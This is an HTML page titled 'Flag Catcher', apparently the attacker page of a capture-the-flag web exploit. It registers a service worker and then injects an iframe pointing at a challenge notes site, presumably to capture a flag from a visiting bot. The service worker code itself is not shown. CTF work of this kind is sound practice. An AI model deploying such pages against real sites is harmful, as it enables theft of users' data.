<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Flag Catcher</title>
</head>
<body>
  <h1>Waiting for the flag...</h1>

  <script>
    navigator.serviceWorker.register("/sw.js").then(() => {
      console.log("[INFO] Service worker registered.");

      setTimeout(() => {
        console.log("[INFO] Injecting iframe to load /notes/");
        let iframe = document.createElement("iframe");
        iframe.src = "https://fnotes-web.ctf-chal.idek.team/notes/";
        document.body.appendChild(iframe);
      }, 1000);
    });
  </script>
</body>
</html>
